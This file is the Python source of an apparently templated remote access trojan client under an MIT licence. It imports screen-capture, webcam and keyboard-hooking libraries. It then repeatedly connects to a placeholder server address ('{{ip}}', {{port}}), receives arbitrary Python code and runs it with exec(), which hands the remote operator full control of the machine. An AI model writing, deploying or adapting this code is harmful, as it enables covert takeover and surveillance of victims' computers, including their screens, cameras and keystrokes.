# type: ignore
"""
MIT License

Copyright (c) 2024 NoticedCloud348

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket
import os
import sys
from PIL import ImageGrab
import io
import pickle
import cv2
import keyboard
import subprocess
import platform
import psutil
import GPUtil
{{imports}}

ex = False
st = None

def Main():
    global ex, st
    
    while not ex:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as st:
                try:
                    st.connect(('{{ip}}', {{port}}))
                except:
                    print("Impossible to connect to server")
                data = ""
                while True:
                    newdata = st.recv(1024)
                    if not newdata or newdata == b"{fine}":
                        break
                    data += newdata.decode()
                    st.send(b"recived")

                globals_dict = globals()
                exec(data, globals_dict)

                ex = globals_dict["ex"]
                print(ex)

        except Exception as e:
            print("Connection to server not enstablised")
            print(e)

Main()